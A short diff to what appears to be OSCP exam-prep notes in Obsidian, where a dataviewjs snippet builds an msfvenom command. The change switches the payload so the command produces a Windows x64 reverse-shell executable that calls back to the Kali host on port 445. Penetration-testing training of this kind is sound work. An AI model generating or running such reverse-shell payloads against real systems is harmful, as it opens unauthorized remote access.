@@ -307,7 +307,7 @@ Windows TCP Reverse shell EXE | PORT 445 | shell.exe
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${KaliIP} LPORT=445 -f exe > shell.exe`;
+const command = `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${KaliIP} LPORT=445 -f exe > shell.exe`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
